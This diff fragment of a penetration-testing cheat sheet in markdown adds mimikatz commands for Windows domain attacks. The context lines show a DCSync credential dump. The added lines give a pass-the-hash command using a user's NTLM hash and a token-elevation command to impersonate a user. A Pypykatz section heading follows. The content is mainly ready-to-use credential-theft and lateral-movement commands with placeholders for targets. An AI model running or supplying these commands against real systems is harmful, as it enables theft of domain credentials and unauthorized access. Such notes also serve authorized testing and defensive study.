@@ -78,6 +78,18 @@ $Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', 
 Start-Process C:\Temp\mimikatz\mimikatz.exe -Credential $Cred -ArgumentList '"lsadump::dcsync /user:<DOMAIN>\<TARGET_USER>"'
 ```
 
+PTH (pass the hash)
+
+```powershell
+C:\Temp\mimikatz\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH>" exit
+```
+
+Elevate (impersonate user)
+
+```powershell
+token::elevate /user:<USER>
+```
+
 ## Pypykatz
 
 Get secrets from memory dump
